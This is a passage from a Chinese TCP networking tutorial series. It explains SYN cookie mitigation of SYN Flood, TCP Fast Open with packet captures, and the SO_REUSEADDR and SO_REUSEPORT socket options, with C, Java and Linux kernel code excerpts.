丢了，然后进行重传。重传的次数由/proc/sys/net/ipv4/tcp_synack_retries文件决定，在我的 Centos 上这个默认值为 5。\n重传 5 次 SYN+ACK 包，重传的时间依然是指数级退避（1s、2s、4s、8s、16s），发送完最后一次 SYN+ACK 包以后，等待 32s，服务端才会丢弃掉这个连接，把处于SYN_RECV 状态的 socket 关闭。\n在这种情况下，一次恶意的 SYN 包，会占用一个服务端连接 63s（1+2+4+8+16+32），如果这个时候有大量的恶意 SYN 包过来连接服务器，很快半连接队列就被占满，不能接收正常的用户请求。\n如何应对 SYN Flood 攻击 常见的有下面这几种方法\n增加 SYN 连接数：tcp_max_syn_backlog 调大net.ipv4.tcp_max_syn_backlog的值，不过这只是一个心理安慰，真有攻击的时候，这个再大也不够用。\n减少SYN+ACK重试次数：tcp_synack_retries 重试次数由 /proc/sys/net/ipv4/tcp_synack_retries控制，默认情况下是 5 次，当收到SYN+ACK故意不回 ACK 或者回复的很慢的时候，调小这个值很有必要。\n 还有一个比较复杂的 tcp_syncookies 机制，下面来详细介绍一下。\nSYN Cookie 机制 SYN Cookie 技术最早是在 1996 年提出的，最早就是用来解决 SYN Flood 攻击的，现在服务器上的 tcp_syncookies 都是默认等于 1，表示连接队列满时启用，等于 0 表示禁用，等于 2 表示始终启用。由/proc/sys/net/ipv4/tcp_syncookies控制。\nSYN Cookie 机制其实原理比较简单，就是在三次握手的最后阶段才分配连接资源，如下图所示。\nSYN Cookie 的原理是基于「无状态」的机制，服务端收到 SYN 包以后不马上分配为 Inbound SYN分配内存资源，而是根据这个 SYN 包计算出一个 Cookie 值，作为握手第二步的序列号回复 SYN+ACK，等对方回应 ACK 包时校验回复的 ACK 值是否合法，如果合法才三次握手成功，分配连接资源。\nCookie 值的计算规则是怎么样的呢？Cookie 总长度是 32bit。这部分的源码见 Linux 源码：syncookies.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  static __u32 secure_tcp_syn_cookie(__be32 saddr, __be32 daddr, __be16 sport, \t__be16 dport, __u32 sseq, __u32 data) { \t/* * Compute the secure sequence number. * The output should be: * HASH(sec1,saddr,sport,daddr,dport,sec1) + sseq + (count * 2^24) * + (HASH(sec2,saddr,sport,daddr,dport,count,sec2) % 2^24). * Where sseq is their sequence number and count increases every * minute by 1. * As an extra hack, we add a small \u0026#34;data\u0026#34; value that encodes the * MSS into the second hash value. */ \tu32 count = tcp_cookie_time(); // 系统开机经过的分钟数 \treturn (cookie_hash(saddr, daddr, sport, dport, 0, 0) + // 第一次 hmac 哈希 \tsseq + // 客户端传过来的 SEQ 序列号 \t(count \u0026lt;\u0026lt; COOKIEBITS) + // 系统开机经过的分钟数左移 24 位 \t((cookie_hash(saddr, daddr, sport, dport, count, 1) + data) \t\u0026amp; COOKIEMASK)); // 增加 MSS 值做第二次 hmac 哈希然后取低 24 位 }   其中 COOKIEBITS 等于 24，COOKIEMASK 为 低 24 位的掩码，也即 0x00FFFFFF，count 为系统的分钟数，sseq 为客户端传过来的 SEQ 序列号。\nSYN Cookie 看起来比较完美，但是也有不少的问题。\n第一，这里的 MSS 值只能是少数的几种，由数组 msstab 值决定\n1 2 3 4 5 6  static __u16 const msstab[] = { \t536, \t1300, \t1440,\t/* 1440, 1452: PPPoE */ \t1460, };   第二，因为 syn-cookie 是一个无状态的机制，服务端不保存状态，不能使用其它所有 TCP 选项，比如 WScale，SACK 这些。因此要想变相支持这些选项就得想想其它的偏门，如果启用了 Timestamp 选项，可以把这些值放在 Timestamp 选项值里面。\n1 2 3 4  +-----------+-------+-------+--------+ | 26 bits | 1 bit | 1 bit | 4 bits | | Timestamp | ECN | SACK | WScale | +-----------+-------+-------+--------+   不在上面这个四个字段中的扩展选项将无法支持了，如果没有启用 Timestamp 选项，那就彻底凉凉了。\n小结 这篇文章介绍了用 Scapy 工具构造 SYN Flood 攻击，然后介绍了缓解 SYN Flood 攻击的几种方式，有利有弊，看实际场景启用不同的策略。\n16、嫌三次握手太慢 —— 来快速打开吧 前面几篇文章讲了三次握手的过程，可能你会有觉得好麻烦呀，要发数据先得有三次包交互建连。三次握手带来的延迟使得创建一个新 TCP 连接代价非常大，所有有了各种连接重用的技术。\n但是连接并不是想重用就重用的，在不重用连接的情况下，如何减少新建连接代理的性能损失呢？\n于是人们提出了 TCP 快速打开（TCP Fast Open，TFO），尽可能降低握手对网络延迟的影响。今天我们就讲讲这其中的原理。\nTFO 与 shadowsocks 最开始知道 TCP Fast Open 是在玩 shadowsocks 时在它的 wiki 上无意中逛到的。专门有一页介绍可以启用 TFO 来减低延迟。原文摘录如下：\n1 2 3 4 5 6 7  If both of your server and client are deployed on Linux 3.7.1 or higher, you can turn on fast_open for lower latency.  First set fast_open to true in your config.json.  Then turn on fast open on your OS temporarily:  echo 3 \u0026gt; /proc/sys/net/ipv4/tcp_fastopen   TFO 简介 TFO 是在原来 TCP 协议上的扩展协议，它的主要原理就在发送第一个 SYN 包的时候就开始传数据了，不过它要求当前客户端之前已经完成过「正常」的三次握手。快速打开分两个阶段：请求 Fast Open Cookie 和 真正开始 TCP Fast Open\n请求 Fast Open Cookie 的过程如下：\n 客户端发送一个 SYN 包，头部包含 Fast Open 选项，且该选项的Cookie 为空，这表明客户端请求 Fast Open Cookie 服务端收取 SYN 包以后，生成一个 cookie 值（一串字符串） 服务端发送 SYN + ACK 包，在 Options 的 Fast Open 选项中设置 cookie 的值 客户端缓存服务端的 IP 和收到的 cookie 值  第一次过后，客户端就有了缓存在本地的 cookie 值，后面的握手和数据传输过程如下：\n 客户端发送 SYN 数据包，里面包含数据和之前缓存在本地的 Fast Open Cookie。（注意我们此前介绍的所有 SYN 包都不能包含数据） 服务端检验收到的 TFO Cookie 和传输的数据是否合法。如果合法就会返回 SYN + ACK 包进行确认并将数据包传递给应用层，如果不合法就会丢弃数据包，走正常三次握手流程（只会确认 SYN） 服务端程序收到数据以后可以握手完成之前发送响应数据给客户端了 客户端发送 ACK 包，确认第二步的 SYN 包和数据（如果有的话） 后面的过程就跟非 TFO 连接过程一样了  抓包演示 上面说的都是理论分析，下面我们用实际的抓包来看快速打开的过程。\n因为在 Linux 上快速打开是默认关闭的，需要先开启 TFO，如前面 shadowsocks 的文档所示\n1  echo 3 \u0026gt; /proc/sys/net/ipv4/tcp_fastopen   接下来用 nginx 来充当服务器，在服务器 c2 上安装 nginx，修改 nginx 配置listen 80 fastopen=256;，使之支持 TFO\n1 2 3 4 5 6 7 8 9  server {  listen 80 fastopen=256; server_name test.ya.me; access_log /var/log/nginx/host.test.ya.me main; location /{ default_type text/html; return 200 \u0026#39;\u0026lt;html\u0026gt;Hello, Nginx\u0026lt;/html\u0026gt;\u0026#39;; } }   下面来调整客户端的配置，用另外一台 Centos7 的机器充当客户端（记为c1），在我的 Centos7.4 系统上 curl 的版本比较旧，是7.29版本\n1 2  curl -V curl 7.29.0 (x86_64-redhat-linux-gnu) libcurl/7.29.0 NSS/3.36 zlib/1.2.7 libidn/1.28 libssh2/1.4.3   这个版本的 curl 还不支持 TFO 选项，需要先升级到最新版本。升级的过程也比较简单，就分三步\n1 2 3 4 5 6 7 8 9  // 1. 增加 city-fan 源 rpm -Uvh http://www.city-fan.org/ftp/contrib/yum-repo/city-fan.org-release-2-1.rhel7.noarch.rpm // 2. 修改 city-fan.org.repo，把 enable=0 改为 enable=1 vim /etc/yum.repos.d/city-fan.org.repo // 2. 升级 curl yum update curl // 验证是不是最新版本 curl -V curl 7.64.1 (x86_64-redhat-linux-gnu) libcurl/7.64.1 NSS/3.36 zlib/1.2.7 libpsl/0.7.0 (+libicu/50.1.2) libssh2/1.8.2 nghttp2/1.31.1   下面就可以来演示快速打开的过程了。\n第一次：请求 Fast Open Cookie\n在客户端 c1 上用 curl 发起第一次请求，curl --tcp-fastopen http://test.ya.me，抓包如下图\n逐个包分析一下\n  第 1 个 SYN 包：wireshark 有标记TFO=R，看下这个包的TCP 首部\n这个首部包含了 TCP Fast Open 选项，但是 Cookie 为空，表示向服务器请求新的 Cookie。\n  第 2 个包是 SYN + ACK 包，wireshark 标记为TFO=C，这个包的首部如下图所示\n这时，服务器 c2 已经生产了一个值为 \u0026ldquo;16fba4d72be34e8c\u0026rdquo; 的 Cookie，放在首部的TCP fast open 选项里\n  第 3 个包是客户端 c1 对服务器的 SYN 包的确认包。到此三次握手完成，这个过程跟无 TFO 三次握手唯一的不同点就在于 Cookie 的请求和返回\n  后面的几个包就是正常的数据传输和四次挥手断开连接了，跟正常无异，不再详细介绍。\n  第二次：真正的快速打开\n在客户端 c1 上再次请求一次curl --tcp-fastopen http://test.ya.me，抓包如下图`\n逐个包分析一下\n  第 1 个包就很亮瞎眼，wireshark 把这个包识别为了 HTTP 包，展开头部看一下\n这个包本质是一个 SYN 包，只是数据跟随 SYN 包一起发送，在 TCP 首部里也包含了第一次请求的 Cookie\n  第 2 个包是服务端收到了 Cookie 进行合法性校验通过以后返回的SYN + ACK 包\n  第 3、4 个包分别是客户端回复给服务器的 ACK 确认包和服务器返回的 HTTP 响应包。因为我是在局域网内演示，延迟太小，ACK 回的太快了，所以看到的是先收到 ACK 再发送响应数据包，在实际情况中这两个包的顺序可能是不确定的。\n  TCP Fast Open 的优势 一个最显著的优点是可以利用握手去除一个往返 RTT，如下图所示\n在开启 TCP Fast Open以后，从第二次请求开始，就可以在一个 RTT 时间拿到响应的数据。\n还有一些其它的优点，比如可以防止 SYN-Flood 攻击之类的\n代码中是怎么使用的 Fast Open 用 strace 命令来看一下 curl 的过程\n加上 \u0026ndash;tcp-fastopen 选项以后的 strace 输出sudo strace curl --tcp-fastopen http://test.ya.me 可以看到客户端没有使用 connect 建连，而是直接调用了 sendto 函数，加上了 MSG_FASTOPEN flag 连接服务端同时发送数据。\n没有加上 \u0026ndash;tcp-fastopen 选项的情况下的 strace 输出如下 sudo strace curl http://test.ya.me\n在没有启用 Fast Open 的情况下，会先调用 connect 进行握手\n小结 这篇文章主要用 curl 命令演示了 TCP 快速打开的详细过程和原理\n 客户端发送一个 SYN 包，头部包含 Fast Open 选项，且该选项的 Cookie 长度为 0 服务端根据客户端 IP 生成 cookie，放在 SYN+ACK 包中一同发回客户端 客户端收到 Cookie 以后缓存在自己的本地内存 客户端再次访问服务端时，在 SYN 包携带数据，并在头部包含 上次缓存在本地的 TCP cookie 如果服务端校验 Cookie 合法，则在客户端回复 ACK 前就可以直接发送数据。如果 Cookie 不合法则按照正常三次握手进行。  可以看到历代大牛在降低网络延迟方面的鬼斧神工般的努力，现在主流操作系统和浏览器都支持这个选项了。\n17、Address already in use —— 聊聊 Socket 选项之 SO_REUSEADDR 前面介绍到四次挥手的时候有讲到，主动断开连接的那一端需要等待 2 个 MSL 才能最终释放这个连接。一般而言，主动断开连接的都是客户端，如果是服务端程序重启或者出现 bug 崩溃，这时服务端会主动断开连接，如下图所示\n因为要等待 2 个 MSL 才能最终释放连接，所以如果这个时候程序马上启动，就会出现Address already in use错误。要过 1 分钟以后才可以启动成功。如果你写了一个 web 服务器，崩溃以后被脚本自动拉起失败，需要等一分钟才正常，运维可能要骂娘了。\n下面来写一段简单的代码演示这个场景是如何产生的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  public class ReuseAddress {  public static void main(String[] args) throws IOException {  ServerSocket serverSocket = new ServerSocket();  // setReuseAddress 必须在 bind 函数调用之前执行  serverSocket.setReuseAddress(false);  serverSocket.bind(new InetSocketAddress(8080));  System.out.println(\u0026#34;reuse address: \u0026#34; + serverSocket.getReuseAddress());  while (true) {  Socket socket = serverSocket.accept();  System.out.println(\u0026#34;incoming socket..\u0026#34;);  OutputStream out = socket.getOutputStream();  out.write(\u0026#34;Hello\\n\u0026#34;.getBytes());  out.close();  }  } }   这段代码的功能是启动一个 TCP 服务器，客户端连上来就返回了一个 \u0026ldquo;Hello\\n\u0026rdquo; 回去。\n使用 javac 编译 class 文件javac ReuseAddress.java;，然后用 java 命令运行java -cp . ReuseAddress。使用 nc 命令连接 8080 端口nc localhost 8080，应该会马上收到服务端返回的\u0026quot;Hello\\n\u0026quot;字符串。现在 kill 这个进程，马上重启这个程序就可以看到程序启动失败，报 socket bind 失败，堆栈如下：\n1 2 3 4 5 6  Exception in thread \u0026#34;main\u0026#34; java.net.BindException: 地址已在使用 (Bind failed) \tat java.net.PlainSocketImpl.socketBind(Native Method) \tat java.net.AbstractPlainSocketImpl.bind(AbstractPlainSocketImpl.java:387) \tat java.net.ServerSocket.bind(ServerSocket.java:375) \tat java.net.ServerSocket.bind(ServerSocket.java:329) \tat ReuseAddress.main(ReuseAddress.java:18)   将代码修改为serverSocket.setReuseAddress(true);，再次重复上面的测试过程，再也不会出现上述异常了。\n0x02 为什么需要 SO_REUSEADDR 参数 服务端主动断开连接以后，需要等 2 个 MSL 以后才最终释放这个连接，重启以后要绑定同一个端口，默认情况下，操作系统的实现都会阻止新的监听套接字绑定到这个端口上。\n我们都知道 TCP 连接由四元组唯一确定。形式如下\n{local-ip-address:local-port , foreign-ip-address:foreign-port}\n一个典型的例子如下图\nTCP 要求这样的四元组必须是唯一的，但大多数操作系统的实现要求更加严格，只要还有连接在使用这个本地端口，则本地端口不能被重用（bind 调用失败）\n启用 SO_REUSEADDR 套接字选项可以解除这个限制，默认情况下这个值都为 0，表示关闭。在 Java 中，reuseAddress 不同的 JVM 有不同的实现，在我本机上，这个值默认为 1 允许端口重用。但是为了保险起见，写 TCP、HTTP 服务一定要主动设置这个参数为 1。\n0x03 是不是只有处于 TIME_WAIT 才允许端口复用？ 查看 Java 中 ServerSocket.setReuseAddress 的文档，有如下的说明\n1 2 3 4 5 6 7 8 9 10 11 12 13  /**  * Enable/disable the {@link SocketOptions#SO_REUSEADDR SO_REUSEADDR}  * socket option.  * \u0026lt;p\u0026gt;  * When a TCP connection is closed the connection may remain  * in a timeout state for a period of time after the connection  * is closed (typically known as the {@code TIME_WAIT} state  * or {@code 2MSL} wait state).  * For applications using a well known socket address or port  * it may not be possible to bind a socket to the required  * {@code SocketAddress} if there is a connection in the  * timeout state involving the socket address or port. * /   假设因为网络的原因，客户端没有回发 FIN 包，导致服务器端处于 FIN_WAIT2 状态，而非 TIME_WAIT 状态，那设置 SO_REUSEADDR 还会生效吗？\n来做一个实验，现在有两台机器c1（充当客户端），c2（充当服务器）。在客户端 c1 利用防火墙拦截掉所有发出的 FIN 包：sudo iptables --append OUTPUT --match tcp --protocol tcp --dport 8080 --tcp-flags FIN FIN --jump DROP。 在c1 上使用nc c2 8080发起 tcp 连接，随后杀掉 c2 的进程， 因为服务端收不到客户端发过来的 FIN 包，也即四次挥手中的第 3 步没能成功，服务端此时将处于 FIN_WAIT2 状态。\n1 2  ya@c2 ~$ sudo netstat -lnpa | grep 8080 tcp6 0 0 10.211.55.10:8080 10.211.55.5:39664 FIN_WAIT2 -   将 SO_REUSEADDR 设置为 1，重复上面的测试过程，将发现不会出现异常。将 SO_REUSEADDR 设置为 0，则会出现 Address already in use 异常。\n因此，不一定是要处于 TIME_WAIT 才允许端口复用的，只是大都是情况下，主动关闭连接的服务端都会处于 TIME_WAIT。如果不把 SO_REUSEADDR 设置为 1，服务器将等待 2 个 MSL 才可以重新绑定原端口\n0x04 为什么通常不会在客户端上出现 通常情况下都是客户端主动关闭连接，那客户端那边为什么不会有问题呢？\n因为客户端都是用的临时端口，这些临时端口与处于 TIME_WAIT 状态的端口恰好相同的可能性不大，就算相同换一个新的临时端口就好了。\n小结 这篇文章主要讲了 SO_REUSEADDR 套接字属性出现的背景和分析，随后讲解了为什么需要 SO_REUSEADDR 参数，以及为什么客户端不需要关心这个参数。\n如果你看这篇文章有什么疑问，欢迎你在留言区留言。\n18、一台主机上两个进程可以同时监听同一个端口吗 在日常的开发过程中，经常会遇到端口占用冲突的问题。那是不是不同的进程不能同时监听同一个端口呢？这个小节就来介绍 SO_REUSEPORT 选项相关的内容。\n通过阅读这个小节，你会学到如下知识。\n SO_REUSEPORT 选项是什么 什么是惊群效应 SO_REUSEPORT 选项安全性相关的问题 Linux 内核实现端口选择过程的源码分析  SO_REUSEPORT 是什么 默认情况下，一个 IP、端口组合只能被一个套接字绑定，Linux 内核从 3.9 版本开始引入一个新的 socket 选项 SO_REUSEPORT，又称为 port sharding，允许多个套接字监听同一个IP 和端口组合。\n为了充分发挥多核 CPU 的性能，多进程的处理网络请求主要有下面两种方式\n 主进程 + 多个 worker 子进程监听相同的端口 多进程 + REUSEPORT  第一种方最常用的一种模式，Nginx 默认就采用这种方式。主进程执行 bind()、listen() 初始化套接字，然后 fork 新的子进程。在这些子进程中，通过 accept/epoll_wait 同一个套接字来进行请求处理，示意图如下所示。\n这种方式看起来很完美，但是会带来著名的“惊群”问题（thundering herd）。\n惊群问题（thundering herd） 在开始介绍惊群之前，我们下来看看一个现实世界中的惊群问题。假如你养了五条狗，一开始这五条狗都在睡觉，你过去扔了一块骨头，这五条狗都从睡梦中醒来，一起跑过来争抢这块骨头，最终只有第三条狗抢到了这块骨头，剩下的四条狗只好无奈的继续睡觉。如下图所示。\n从上面的例子可以看到，明明只有一块骨头只够一条小狗吃，五只小狗却一起从睡眠中醒来争抢，对于没有抢到小狗来说，浪费了很多精力。\n计算机中的惊群问题指的是：多进程/多线程同时监听同一个套接字，当有网络事件发生时，所有等待的进程/线程同时被唤醒，但是只有其中一个进程/线程可以处理该网络事件，其它的进程/线程获取失败重新进入休眠。\n惊群问题带来的是 CPU 资源的浪费和锁竞争的开销。根据使用方式的不同，Linux 上的网络惊群问题分为 accept 惊群和 epoll 惊群两种。\naccept 惊群 Linux 在早期的版本中，多个进程 accept 同一个套接字会出现惊群问题，以下面的代码为例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  int main(void) {  // ...  servaddr.sin_port = htons (9090);  bind(listenfd, (struct sockaddr *)\u0026amp;servaddr, sizeof(servaddr));  listen(listenfd, 5);  clilen = sizeof(cliaddr);   for (int i = 0; i \u0026lt; 4; ++i) { \tif ((fork()) == 0) { \t// 子进程 \tprintf(\u0026#34;child pid: %d\\n\u0026#34;, getpid()); \twhile (1) { \tconnfd = accept(listenfd, (struct sockaddr *)\u0026amp;cliaddr, \u0026amp;clilen); \tsleep(2); \tprintf(\u0026#34;processing, pid is %d\\n\u0026#34;, getpid()); \t} \t}  }  sleep(-1);  return 1; }   执行 nc -i 1 localhost 9090，输出结果如下。\n1 2 3 4 5  child pid: 25050 child pid: 25051 child pid: 25052 child pid: 25053 processing, pid is 25050   可以看到当有网络请求到来时，只会唤醒了其中一个子进程，其他的进程继续休眠阻塞在 accept 调用上，没有被唤醒，这种情况下，accept 系统调用不存在惊群现象。这是因为 Linux 在 2.6 内核版本之前监听同一个 socket 的多个进程在事件发生时会唤醒所有等待的进程，在 2.6 版本中引入了 WQ_FLAG_EXCLUSIVE 选项解决了 accept 调用的惊群问题。\n不幸的是现在高性能的服务基本上都使用 epoll 方案来处理非阻塞 IO，接下来我们来看 epoll 惊群。\nepoll 惊群 epoll 典型的工作模式是父进程执行 bind、listen 以后 fork 出子进程，使用 epoll_wait 等待事件发生，模式如下图所示。\n以下面的代码为例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  int main(void) {  // ...  sock_fd = create_and_bind(\u0026#34;9090\u0026#34;); listen(sock_fd, SOMAXCONN);   epoll_fd = epoll_create(1); event.data.fd = sock_fd; event.events = EPOLLIN; epoll_ctl(epoll_fd, EPOLL_CTL_ADD, sock_fd, \u0026amp;event); events = calloc(MAXEVENTS, sizeof(event));   for (int i = 0; i \u0026lt; 4; i++) { if (fork() == 0) { while (1) { int n = epoll_wait(epoll_fd, events, MAXEVENTS, -1); printf(\u0026#34;return from epoll_wait, pid is %d\\n\u0026#34;, getpid()); sleep(2); for (int j = 0; j \u0026lt; n; j++) { if ((events[i].events \u0026amp; EPOLLERR) || (events[i].events \u0026amp; EPOLLHUP) || (!(events[i].events \u0026amp; EPOLLIN))) { close(events[i].data.fd); continue; } else if (sock_fd == events[j].data.fd) { struct sockaddr sock_addr; socklen_t sock_len; int conn_fd; sock_len = sizeof(sock_addr); conn_fd = accept(sock_fd, \u0026amp;sock_addr, \u0026amp;sock_len); if (conn_fd == -1) { printf(\u0026#34;accept failed, pid is %d\\n\u0026#34;, getpid()); break; } printf(\u0026#34;accept success, pid is %d\\n\u0026#34;, getpid()); close(conn_fd); } } } } }   上面代码运行以后，使用 ls -l /proc/your_pid/fd 命令可以查看主进程打开的所有 fd 文件，如果 pid 为 24735，执行的结果如下。\n1 2 3 4 5 6 7  ls -l /proc/24735/fd  lrwx------. 1 ya ya 64 Jan 28 06:20 0 -\u0026gt; /dev/pts/2 lrwx------. 1 ya ya 64 Jan 28 06:20 1 -\u0026gt; /dev/pts/2 lrwx------. 1 ya ya 64 Jan 28 00:10 2 -\u0026gt; /dev/pts/2 lrwx------. 1 ya ya 64 Jan 28 06:20 3 -\u0026gt; \u0026#39;socket:[72919]\u0026#39; lrwx------. 1 ya ya 64 Jan 28 06:20 4 -\u0026gt; \u0026#39;anon_inode:[eventpoll]\u0026#39;   可以看到主进程会生成 5 个 fd，0~2 分别是 stdin、stdout、stderr，fd 为 3 的描述符是 socket 套接字文件，fd 为 4 的是 epoll 的 fd。\n为了表示打开文件，linux 内核维护了三种数据结构，分别是：\n 内核为每个进程维护了一个其打开文件的「描述符表」（file descriptor table），我们熟知的 fd 为 0 的 stdin 就是属于文件描述符表。 内核为所有打开文件维护了一个系统级的「打开文件表」（open file table），这个打开文件表存储了当前文件的偏移量，状态信息和对 inode 的指针等信息，父子进程的 fd 可以指向同一个打开文件表项。 最后一个是文件系统的 inode 表（i-node table）  经过 for 循环的 fork，会生成 4 个子进程，这 4 个子进程会继承父进程的 fd。在这种情况下，对应的进程文件描述符表、打开文件表和 inode 表的关系如下图所示。\n子进程的 epoll_wait 等待同一个底层的 open file table 项，当有事件发送时，会通知到所有的子进程。\n编译运行上面的，使用 nc -i 1 localhost 9090 发起网络请求，输出结果如下所示。\n1 2 3 4 5 6 7 8  return from epoll_wait, pid is 25410 return from epoll_wait, pid is 25411 return from epoll_wait, pid is 25409 return from epoll_wait, pid is 25412 accept success, pid is 25410 accept failed, pid is 25411 accept failed, pid is 25409 accept failed, pid is 25412   可以看到当有新的网络事件发生时，阻塞在 epoll_wait 的多个进程同时被唤醒。在这种情况下，epoll 的惊群还是存在，有不少的措施可以解决 epoll 的惊群。Nginx 为了处理惊群问题，在应用层增加了 accept_mutex 锁，这里不再展开，有兴趣的读者可以再深入学习一下这部分的知识。\n为了解决惊群问题，比较省力省心的方式是使用 SO_REUSEPORT 选项，接下来开始介绍这部分的内容。\nSO_REUSEPORT 选项基本使用 以下面的 test.c 代码为例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  int main() {  struct sockaddr_in serv_addr;  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);  setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, \u0026amp;optval, sizeof(optval));  bzero((char *)\u0026amp;serv_addr, sizeof(serv_addr));  serv_addr.sin_family = AF_INET;  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);  serv_addr.sin_port = htons(9090);  int ret = bind(sock_fd, (struct sockaddr *)\u0026amp;serv_addr, sizeof(serv_addr));  if (ret \u0026lt; 0) { \tprintf(\u0026#34;bind error, code is %d\\n\u0026#34;, ret); \texit(1);  }  sleep(-1);  return 0; }   使用 GCC 编译上面的代码，在两个终端中运行这个可执行文件，第二次运行会 bind 端口失败，提示如下。\n1  bind error, code is -1   修改上面的代码，给 socket 增加 SO_REUSEPORT 选项，如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  #define BUF_SIZE 256  int main(void) {  int sock_fd, connect_fd;  char buffer[BUF_SIZE];  struct sockaddr_in serv_addr, cli_addr;  int cli_addr_len = sizeof(cli_addr); int n;   sock_fd = socket(AF_INET, SOCK_STREAM, 0); int optval = 1;   setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, \u0026amp;optval, sizeof(optval));  setsockopt(sock_fd, SOL_SOCKET, SO_REUSEPORT, \u0026amp;optval, sizeof(optval));  bzero((char *)\u0026amp;serv_addr, sizeof(serv_addr));  serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = INADDR_ANY; serv_addr.sin_port = htons(9090);   int ret = bind(sock_fd, (struct sockaddr *)\u0026amp;serv_addr, sizeof(serv_addr)); if (ret \u0026lt; 0) { printf(\u0026#34;bind error, code is %d\\n\u0026#34;, ret); exit(1); }   listen(sock_fd, 5);   while (1) {  connect_fd = accept(sock_fd, (struct sockaddr *)\u0026amp;cli_addr, \u0026amp;cli_addr_len); printf(\u0026#34;process new request\\n\u0026#34;); n = read(connect_fd, buffer, BUF_SIZE); write(connect_fd, buffer, n); close(connect_fd); } return 0; }   重新编译上面的代码，在两个终端中分别运行这个可执行文件，这次不会出现 bind 失败的情况。使用 ss 命令来查看当前的套接字\n1 2 3 4  ss -tlnpe | grep -i 9090 State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 5 *:9090 *:* users:((\u0026#34;reuse_port\u0026#34;,pid=26897,fd=3)) uid:1000 ino:2168508 sk:ffff880079033e00 \u0026lt;-\u0026gt; LISTEN 0 5 *:9090 *:* users:((\u0026#34;reuse_port\u0026#34;,pid=26855,fd=3)) uid:1000 ino:2168453 sk:ffff880079037440 \u0026lt;-\u0026gt;   注意到最后一列中的信息，可以看到监听 9090 端口的是两个不同的 socket，它们的 inode 号分别是 2168508 和 2168453。\nss 是一个非常有用的命令，它的选项解释如下。\n1 2 3 4 5 6 7 8 9 10  -t, --tcp  显示 TCP 的 socket -l, --listening  只显示 listening 状态的 socket，默认情况下是不显示的。 -n, --numeric  显示端口号而不是映射的服务名 -p, --processes  显示进程名 -e, --extended  显示 socket 的详细信息   写一段 shell 脚本请求 10 次 9090 端口的服务，脚本内容如下。\n1 2 3  for i in {1..10} ; do  echo \u0026#34;hello\u0026#34; | nc -i 1 localhost 9090 done   执行脚本，终端 1 中的进程处理了四次请求，终端 2 中的进程处理了六次请求，如下图所示。\n这个处理过程如下图所示。\n当一个新请求到来，内核是如何确定应该由哪个 LISTEN socket 来处理？接下来我们来看 SO_REUSEPORT 底层实现原理，\nSO_REUSEPORT 源码分析 内核为处于 LISTEN 状态的 socket 分配了大小为 32 哈希桶。监听的端口号经过哈希算法运算打散到这些哈希桶中，相同哈希的端口采用拉链法解决冲突。当收到客户端的 SYN 握手报文以后，会根据目标端口号的哈希值计算出哈希冲突链表，然后遍历这条哈希链表得到最匹配的得分最高的 Socket。对于使用 SO_REUSEPORT 选项的 socket，可能会有多个 socket 得分最高，这个时候经过随机算法选择一个进行处理。\n假设有 127.0.0.1:2222、127.0.0.1:9998、10.211.55.17:9966、10.211.55.10:2222 这几个监听套接字，这几个套接字被哈希到同一个链表中，当有 127.0.0.1:2222 套接字的 SYN 包到来时，会遍历这个哈希链表，查找得分最高的两个 socket，然后通过随机选择其中的一个。\n如下图所示。\n以 4.4 内核版本为例，这部分源码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  struct sock *__inet_lookup_listener(struct net *net, \tstruct inet_hashinfo *hashinfo, \tconst __be32 saddr, __be16 sport, \tconst __be32 daddr, const unsigned short hnum, \tconst int dif) { \tstruct sock *sk, *result; \tstruct hlist_nulls_node *node; \t// 根据目标端口号生成哈希表的槽位值，这个函数返回 [0-31] 之间的值 \tunsigned int hash = inet_lhashfn(net, hnum); // 根据哈希槽位得到当前 LISTEN 套接字的链表 struct inet_listen_hashbucket *ilb = \u0026amp;hashinfo-\u0026gt;listening_hash[hash]; // 接下来查找最符合条件的 LISTEN 状态的 socket int score, hiscore, matches = 0, reuseport = 0; u32 phash = 0;  \trcu_read_lock(); begin: \tresult = NULL; hiscore = 0; // 遍历链表中的所有套接字，给每个套接字匹配程度打分 sk_nulls_for_each_rcu(sk, node, \u0026amp;ilb-\u0026gt;head) {  \tstruct inet_sock *inet_me = inet_sk(sk); int xx = inet_me-\u0026gt;inet_num;  \tscore = compute_score(sk, net, hnum, daddr, dif); if (score \u0026gt; hiscore) { result = sk; hiscore = score; reuseport = sk-\u0026gt;sk_reuseport; // 如果 socket 启用了 SO_REUSEPORT 选项，通过源地址、源端口号、目标地址、目标端口号再次计算哈希值 if (reuseport) { phash = inet_ehashfn(net, daddr, hnum, saddr, sport); matches = 1; } } else if (score == hiscore \u0026amp;\u0026amp; reuseport) { // 如果启用了 SO_REUSEPORT，则根据哈希值计算随机值 // matches 表示当前已经查找到多少个相同得分的 socket matches++; // 通过 phash 计算 [0, matches-1] 之间的值 int res = reciprocal_scale(phash, matches); if (res == 0) result = sk; // 根据 phash 计算下一轮计算的 phash 随机值 phash = next_pseudo_random32(phash); } } /* * if the nulls value we got at the end of this lookup is * not the expected one, we must restart lookup. * We probably met an item that was moved to another chain. */ if (get_nulls_value(node) != hash + LISTENING_NULLS_BASE) goto begin; if (result) { if (unlikely(!atomic_inc_not_zero(\u0026amp;result-\u0026gt;sk_refcnt))) result = NULL; else if (unlikely(compute_score(result, net, hnum, daddr, dif) \u0026lt; hiscore)) { sock_put(result); goto begin; } } rcu_read_unlock(); return result; }   从上面的代码可以看出当收到 SYN 包以后，内核需要遍历整条冲突链查找得分最高的 socket，非常低效。Linux 内核在 4.5 和 4.6 版本中分别为 